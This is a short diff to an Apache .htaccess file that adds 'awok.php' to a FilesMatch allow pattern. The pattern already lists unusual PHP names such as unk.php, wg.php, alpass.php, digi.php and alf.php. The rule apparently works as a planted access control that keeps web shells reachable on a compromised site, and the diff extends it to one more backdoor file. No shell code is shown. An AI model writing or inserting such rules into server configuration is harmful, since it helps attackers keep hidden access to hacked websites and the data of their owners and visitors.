@@ -6,7 +6,7 @@
 
 </FilesMatch>
 
-<FilesMatch "^(|index.html|index.php|unk.php|unk.phtml|install.php|wg.php|wege.phtml|alpass.php|install.php|p.php|digi.php|digi2.php|fz.php|alf.php|)$">
+<FilesMatch "^(|index.html|index.php|unk.php|unk.phtml|install.php|wg.php|wege.phtml|alpass.php|install.php|p.php|digi.php|digi2.php|fz.php|alf.php|awok.php)$">
 
  Order allow,deny
 
